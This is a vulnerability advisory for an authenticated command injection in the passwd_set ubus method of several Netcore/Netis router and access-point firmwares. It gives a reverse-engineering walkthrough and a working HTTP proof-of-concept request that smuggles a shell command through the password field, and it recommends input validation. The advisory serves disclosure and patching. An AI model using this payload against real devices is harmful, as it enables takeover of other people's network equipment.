# Arbitrary Command Injection Vulnerability in Netcore Routers and Wireless APs After Authorization

## I. Affected Products and Firmware Download Links

NBR1005GPEV2：https://www.netcoretec.com/service-support/download/firmware/2707.html

B6V2：https://www.netcoretec.com/service-support/download/firmware/2703.html

COVER5：https://www.netcoretec.com/service-support/download/firmware/2680.html

NAP930：https://www.netcoretec.com/service-support/download/firmware/2704.html

NAP830：https://www.netcoretec.com/service-support/download/firmware/2708.html

NBR100V2：https://www.netcoretec.com/service-support/download/firmware/2706.html

NBR200V2：https://www.netcoretec.com/service-support/download/firmware/2705.html

## II. Vulnerability Causes

The firmware of these routers uses the `uhttpd` + `ubus` architecture.

**uhttpd (Web Server)**

* Listens on port `80` (HTTP) and accepts `POST /ubus` requests.
* Parses the request header to confirm the `Content-Type` is `application/x-www-form-urlencoded`, but the actual payload is JSON (non-standard but common).
* Forwards requests to the `ubus` RPC service (typically via `ubus` Unix Socket or CGI interface).

Running the `ubus list` command shows registered ubus services

![1746600757491](image/README/1746600757491.png)

The vulnerability is found in `routerd` (file: `/usr/bin/routerd`). In its data segment, the callback function for the `passwd_set` method is `sub_416260`

![1746600953768](image/README/1746600953768.png)

In `sub_416260`, `blobmsg_parse` parses Blob format data (OpenWrt's binary JSON format, see image:

![1746601012709](image/README/1746601012709.png)

The structure mapping is:

* `v19` → `user` (username)
* `v20` → `pwd` (password), with `v16 = v20`
* `v21` → `by` (empty if not provided in the request)

![1746601107563](image/README/1746601107563.png)

The username from `v19` is extracted, skipping the Blobmsg header. Each character is checked to ensure it is `_` (ASCII `0x5F`) or alphanumeric (via `isalnum`). Illegal characters trigger an error log

![1746601255662](image/README/1746601255662.png)

The password from `v16` (stored as `v17`, skipping the Blobmsg header) is passed to `passwd_set_api`  **without any validation** . This function executes `passwd_set_api(username, password)`.

If the result is `0` (success), and the username is "root" with `v15` (value of the `by` field) not equal to "ac", the code writes `v17` to:

```bash
uci set auto_ac.auto_ac.passwd=%s; uci commit auto_ac
```

and calls `system()` with this command, creating a **command injection vulnerability**

![1746601374783](image/README/1746601374783.png)

In `passwd_set_api`, the password (`a2`) is not validated

![1746601489477](image/README/1746601489477.png)

If a password exists, it constructs commands:

```c
snprintf(v10, 0x80u, "passwd %s", a1);  // e.g., "passwd root"
snprintf(v11, 0x80u, "%s\n", a2);       // e.g., "admin123\n"
v4 = popen(v10, "w");                   // Opens a command pipe for writing
fwrite(v11, ...);                        // Writes the password twice (for confirmation)
```

On success, it returns `0`, leading to the command injection vulnerability

![1746601700013](image/README/1746601700013.png)

## III. POC Explanation

```
POST /ubus HTTP/1.1
Host: 192.168.50.2
Content-Length: 163
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/javascript, /; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Origin: http://192.168.50.2
Referer: http://192.168.50.2/guide/guide.html
Accept-Encoding: gzip, deflate, br
Connection: keep-alive{"jsonrpc":"2.0","id":22,"method":"call","params":["a9c61fc83080b13ded7512db83c9b123","routerd","passwd_set",{"user":"root","pwd":"admin123;mkdir -p /tmp/test1"}]}
```

* Replace the `sid` in the `params` field (first value, e.g., `"a9c61fc83080b13ded7512db83c9b123"`) with the actual session ID obtained after login.
* The command `mkdir -p /tmp/test1` can be replaced with any arbitrary command.

Demonstration of remote shell access:

![1746603016270](image/README/1746603016270.png)

## IV. Recommended Solution

Apply the same validation used for the username to the password: restrict it to contain only underscores, letters, and numbers.

**Discoverer: Exploo0Osion.**

**Please contact Netcore (Netis Technology) technical support to fix this vulnerability in a timely manner.**
